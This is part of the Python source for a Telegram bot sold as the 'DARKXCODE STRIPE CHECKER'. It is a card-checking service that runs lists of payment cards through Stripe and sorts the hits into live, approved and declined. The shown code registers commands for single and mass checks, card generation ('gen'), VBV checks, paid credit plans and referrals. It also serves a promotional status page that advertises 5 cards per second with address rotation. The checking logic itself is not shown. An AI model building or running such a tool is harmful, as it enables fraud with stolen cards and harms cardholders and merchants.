            f"🔗 File ID: `{file_id}`\n\n"
            f"*Choose check type:*\n"
            f"• `/mchk` - PRIVATE check (hits to Private channel)\n"
            f"• `/pmchk` - PUBLIC check (hits to Public channel)\n\n"
            f"*Credit Costs Per Card:*\n"
            f"• ✅ Approved/🔥 Live: 3 credits\n"
            f"• 🔢 CCN/💳 CVV: 2 credits\n"
            f"• ❌ Declined: 1 credit",
            parse_mode=ParseMode.MARKDOWN,
        )

    except Exception as e:
        logger.error(f"Error handling file upload: {e}")
        await update.message.reply_text(f"❌ Error processing file: {str(e)[:50]}")


async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle errors gracefully"""
    error_msg = str(context.error) if context.error else "Unknown error"
    logger.error(f"Exception: {error_msg}")

    # Ignore common non-critical errors
    if "Message is not modified" in error_msg:
        return
    if "Query is too old" in error_msg:
        return

    try:
        if update and update.effective_message:
            await update.effective_message.reply_text(
                "*⚠️ SYSTEM ERROR*\n"
                "An error occurred. Please try again.\n"
                "If problem persists, contact admin.",
                parse_mode=ParseMode.MARKDOWN,
            )
    except Exception as e:
        logger.error(f"Error in error handler: {e}")


async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle unknown commands"""
    await update.message.reply_text(
        "*❌ Invalid Command*\n\n" "Use `/help` to see available commands.",
        parse_mode=ParseMode.MARKDOWN,
    )


async def test_group_access_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test if bot can send to groups"""
    if update.effective_user.id not in ADMIN_IDS:
        return

    test_message = "✅ TEST - Bot access check"

    try:
        # Test APPROVED_LOG_CHANNEL (public group)
        try:
            await context.bot.send_message(
                chat_id=APPROVED_LOG_CHANNEL,
                text=test_message,
                parse_mode=ParseMode.HTML,
            )
            await update.message.reply_text(
                f"✅ Successfully sent to PUBLIC group {APPROVED_LOG_CHANNEL}"
            )
        except Exception as e:
            await update.message.reply_text(
                f"❌ Failed to send to PUBLIC group {APPROVED_LOG_CHANNEL}:\n{str(e)}"
            )

        # Test PRIVATE_LOG_CHANNEL (private group/channel)
        try:
            await context.bot.send_message(
                chat_id=PRIVATE_LOG_CHANNEL,
                text=test_message,
                parse_mode=ParseMode.HTML,
            )
            await update.message.reply_text(
                f"✅ Successfully sent to PRIVATE group {PRIVATE_LOG_CHANNEL}"
            )
        except Exception as e:
            await update.message.reply_text(
                f"❌ Failed to send to PRIVATE group {PRIVATE_LOG_CHANNEL}:\n{str(e)}"
            )

    except Exception as e:
        await update.message.reply_text(f"❌ General error:\n{str(e)}")


class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            html = """
            <!DOCTYPE html>
            <html>
            <head>
                <title>⚡ DARKXCODE STRIPE CHECKER ⚡</title>
                <meta name="viewport" content="width=device-width, initial-scale=1">
                <style>
                    body {
                        background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
                        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
                        color: white;
                        text-align: center;
                        padding: 50px;
                        margin: 0;
                        min-height: 100vh;
                        display: flex;
                        flex-direction: column;
                        justify-content: center;
                        align-items: center;
                    }
                    .container {
                        background: rgba(0, 0, 0, 0.7);
                        padding: 40px;
                        border-radius: 20px;
                        box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
                        max-width: 800px;
                        width: 90%;
                        backdrop-filter: blur(10px);
                    }
                    h1 {
                        font-size: 2.5em;
                        margin-bottom: 20px;
                        color: #00ff88;
                        text-shadow: 0 0 10px #00ff88;
                    }
                    .status {
                        font-size: 1.5em;
                        margin: 20px 0;
                        padding: 15px;
                        background: rgba(0, 255, 136, 0.1);
                        border-radius: 10px;
                        border: 2px solid #00ff88;
                    }
                    .info-box {
                        background: rgba(255, 255, 255, 0.1);
                        padding: 20px;
                        border-radius: 10px;
                        margin: 15px 0;
                        text-align: left;
                    }
                    .stats {
                        display: grid;
                        grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                        gap: 15px;
                        margin: 20px 0;
                    }
                    .stat-box {
                        background: rgba(255, 255, 255, 0.1);
                        padding: 15px;
                        border-radius: 10px;
                    }
                    .glow {
                        animation: glow 2s ease-in-out infinite alternate;
                    }
                    @keyframes glow {
                        from { text-shadow: 0 0 5px #fff, 0 0 10px #00ff88; }
                        to { text-shadow: 0 0 10px #fff, 0 0 20px #00ff88, 0 0 30px #00ff88; }
                    }
                    .telegram-btn {
                        display: inline-block;
                        background: #0088cc;
                        color: white;
                        padding: 15px 30px;
                        border-radius: 25px;
                        text-decoration: none;
                        font-weight: bold;
                        margin-top: 20px;
                        transition: all 0.3s;
                    }
                    .telegram-btn:hover {
                        background: #006699;
                        transform: scale(1.05);
                    }
                    footer {
                        margin-top: 30px;
                        color: rgba(255, 255, 255, 0.7);
                        font-size: 0.9em;
                    }
                </style>
            </head>
            <body>
                <div class="container">
                    <h1 class="glow">⚡ DARKXCODE STRIPE CHECKER ⚡</h1>
                    
                    <div class="status">✅ BOT IS ONLINE & RUNNING</div>
                    
                    <div class="info-box">
                        <h3>🤖 Bot Information</h3>
                        <p><strong>Version:</strong> v4.0</p>
                        <p><strong>Status:</strong> Active 24/7</p>
                        <p><strong>Features:</strong> Ultra-fast card checking with real-time results</p>
                    </div>
                    
                    <div class="stats">
                        <div class="stat-box">
                            <h4>⚡ Speed</h4>
                            <p>5 cards/second</p>
                        </div>
                        <div class="stat-box">
                            <h4>📍 Rotation</h4>
                            <p>US, UK, CA, IN, AU</p>
                        </div>
                        <div class="stat-box">
                            <h4>🤝 Referral</h4>
                            <p>100 credits each</p>
                        </div>
                        <div class="stat-box">
                            <h4>🛡️ Security</h4>
                            <p>Encrypted & Secure</p>
                        </div>
                    </div>
                    
                    <div class="info-box">
                        <h3>🚀 Bot Features</h3>
                        <ul style="text-align: left;">
                            <li>• Ultra-Fast Single Card Check</li>
                            <li>• Mass Check with Live Results</li>
                            <li>• Gift Code System</li>
                            <li>• Advanced Admin Panel</li>
                            <li>• Real-time Statistics</li>
                            <li>• Invite & Earn System</li>
                        </ul>
                    </div>
                    
                    <a href="https://t.me/DarkXCode" class="telegram-btn" target="_blank">
                        📲 Contact on Telegram
                    </a>
                    
                    <footer>
                        <p>© 2024 DARKXCODE STRIPE CHECKER | Version 4.0</p>
                        <p>Service Status: <span style="color: #00ff88;">●</span> Operational</p>
                    </footer>
                </div>
                
                <script>
                    // Update time every second
                    function updateTime() {
                        const now = new Date();
                        document.getElementById('current-time').textContent = 
                            now.toLocaleTimeString() + ' ' + now.toLocaleDateString();
                    }
                    setInterval(updateTime, 1000);
                    updateTime();
                </script>
            </body>
            </html>
            """
            self.wfile.write(html.encode())
        elif self.path == "/health":
            self.send_response(200)
            self.send_header("Content-type", "application/json")
            self.end_headers()
            response = {
                "status": "online",
                "service": "darkxcode-stripe-checker",
                "version": "4.0",
                "timestamp": datetime.datetime.now().isoformat(),
            }
            self.wfile.write(json.dumps(response).encode())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        # Disable logging for health checks
        pass


def start_health_server(port=8080):
    """Start a simple HTTP server for health checks"""
    server = HTTPServer(("0.0.0.0", port), HealthHandler)
    print(f"🌐 Health server started on port {port}")
    print(f"🔗 Web interface: http://localhost:{port}")
    print(f"🔗 Health check: http://localhost:{port}/health")
    server.serve_forever()


async def main():
    """Start the bot"""
    print(f"🤖 {BOT_INFO['name']} v{BOT_INFO['version']}")

    if not firebase_connected:
        print("⚠️  Using in-memory storage instead")
        print("⚠️  NOTE: Data will be lost when bot restarts!")
    else:
        print("✅ Firebase connected successfully")

    # Start health server in a separate thread
    health_port = int(os.environ.get("PORT", 8080))
    health_thread = threading.Thread(
        target=start_health_server, args=(health_port,), daemon=True
    )
    health_thread.start()

    # Create application with Pydroid-compatible settings
    application = Application.builder().token(BOT_TOKEN).build()

    # Add error handler
    application.add_error_handler(error_handler)

    # ========== COMMAND HANDLERS ==========
    # Public commands
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("credits", credits_command))
    application.add_handler(CommandHandler("invite", invite_command))
    application.add_handler(CommandHandler("chk", chk_command))
    application.add_handler(CommandHandler("mchk", mchk_command))
    application.add_handler(CommandHandler("pchk", pchk_command))
    application.add_handler(CommandHandler("pmchk", pmchk_command))
    application.add_handler(CommandHandler("claim", claim_command))
    application.add_handler(CommandHandler("cancel", cancel_command))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("daily", daily_command))
    application.add_handler(CommandHandler("dailytop", dailytop_command))
    application.add_handler(CommandHandler("vbv", vbv_command))
    application.add_handler(CommandHandler("gen", gen_command))
    application.add_handler(CommandHandler("plans", plans_command))

    # Admin commands
    application.add_handler(CommandHandler("botinfo", botinfo_command))
    application.add_handler(CommandHandler("setcr", setcr_command))
    application.add_handler(CommandHandler("userinfo", userinfo_command))
    application.add_handler(CommandHandler("addcr", addcr_command))
    application.add_handler(CommandHandler("gengift", gengift_command))
    application.add_handler(CommandHandler("listgifts", listgifts_command))
    application.add_handler(CommandHandler("testaccess", test_group_access_command))
    application.add_handler(CommandHandler("testenc", test_simple_encryption))
    application.add_handler(CommandHandler("setplan", setplan_command))
    application.add_handler(CommandHandler("resetall", resetall_command))
    application.add_handler(CommandHandler("createdb", createdb_command))
    application.add_handler(CommandHandler("checkdb", checkdb_command))
    application.add_handler(CommandHandler("admin", admindb_command))
    application.add_handler(CommandHandler("backupdb", backupdb_command))

    # ========== MESSAGE HANDLERS ==========
    application.add_handler(
        MessageHandler(filters.Document.ALL, handle_file_upload_message)
    )

    # ========== CALLBACK HANDLERS ==========
    application.add_handler(
        CallbackQueryHandler(verify_join_callback, pattern="^verify_join$")
    )
    application.add_handler(
        CallbackQueryHandler(back_to_start_callback, pattern="^back_to_start$")
    )
    application.add_handler(
        CallbackQueryHandler(quick_check_callback, pattern="^quick_check$")
    )
    application.add_handler(
        CallbackQueryHandler(mass_check_callback, pattern="^mass_check$")
    )
    application.add_handler(
        CallbackQueryHandler(my_credits_callback, pattern="^my_credits$")
    )
    application.add_handler(CallbackQueryHandler(invite_callback, pattern="^invite$"))
    application.add_handler(
        CallbackQueryHandler(copy_invite_callback, pattern="^copy_invite$")
    )
    application.add_handler(
        CallbackQueryHandler(admin_panel_callback, pattern="^admin_panel$")
    )
    application.add_handler(
        CallbackQueryHandler(claim_gift_callback, pattern="^claim_gift$")
    )
    application.add_handler(
        CallbackQueryHandler(start_mass_check_callback, pattern="^start_mass_")
    )

    application.add_handler(
        CallbackQueryHandler(admin_checkdb_callback, pattern="^admin_checkdb$")
    )
    application.add_handler(
        CallbackQueryHandler(admin_backup_callback, pattern="^admin_backup$")
    )
    application.add_handler(
        CallbackQueryHandler(admin_createdb_callback, pattern="^admin_createdb$")
    )
    application.add_handler(
        CallbackQueryHandler(cancel_check_callback, pattern="^cancel_check_")
    )  # Fixed
    application.add_handler(
        CallbackQueryHandler(cancel_mass_callback, pattern="^cancel_mass$")
    )  # Fixed
    application.add_handler(
        CallbackQueryHandler(
            refresh_leaderboard_callback, pattern="^refresh_leaderboard$"
        )
    )
    application.add_handler(
        CallbackQueryHandler(
            claim_daily_from_leaderboard, pattern="^claim_daily_from_leaderboard$"
        )
    )
    application.add_handler(
        CallbackQueryHandler(admin_resetall_callback, pattern="^admin_resetall$")
    )
    application.add_handler(
        CallbackQueryHandler(confirm_reset_all_callback, pattern="^confirm_reset_all$")
    )
    application.add_handler(
        CallbackQueryHandler(cancel_reset_callback, pattern="^cancel_reset$")
    )

    # Admin panel callbacks
    application.add_handler(
        CallbackQueryHandler(admin_addcr_callback, pattern="^admin_addcr$")
    )
    application.add_handler(
        CallbackQueryHandler(admin_gengift_callback, pattern="^admin_gengift$")
    )
    application.add_handler(
        CallbackQueryHandler(admin_listgifts_callback, pattern="^admin_listgifts$")
    )
    application.add_handler(
        CallbackQueryHandler(admin_userinfo_callback, pattern="^admin_userinfo$")
    )
    application.add_handler(
        CallbackQueryHandler(admin_botinfo_callback, pattern="^admin_botinfo$")
    )

    # ========== UNKNOWN COMMAND HANDLER ==========
    # Must be added LAST to catch all other commands
    application.add_handler(MessageHandler(filters.COMMAND, unknown_command))

    # Start bot with Pydroid-compatible settings
    print(f"📍 Address Rotation: Enabled (US, UK, CA, IN, AU)")
    print(f"🤝 Invite & Earn: 100 credits per referral")
    print(f"📊 Database: ✅ Connected")
    print(
        f"🔐 Admin Commands: {len(ADMIN_IDS) if isinstance(ADMIN_IDS, list) else 1} admin(s)"
    )
    print("✅ Bot is running...")

    # Start polling with Pydroid-compatible settings
    await application.initialize()
    await application.start()

    try:
        await application.updater.start_polling()
        # Keep the bot running
        while True:
            await asyncio.sleep(3600)  # Sleep for 1 hour
    except asyncio.CancelledError:
        pass
    finally:
        await application.stop()
        await application.shutdown()


def start_bot():
    """Start the bot for Pydroid 3 compatibility"""
    try:
        # Create a new event loop for Pydroid
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)

        # Run the bot
        loop.run_until_complete(main())
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped by user")
    except Exception as e:
        print(f"❌ Bot crashed: {e}")
        import traceback

        traceback.print_exc()


if __name__ == "__main__":
    print(f"🤖 {BOT_INFO['name']} v{BOT_INFO['version']}")

    # For Render.com compatibility
    port = int(os.environ.get("PORT", 8080))
    print(f"🌐 Starting on port: {port}")

    start_bot()
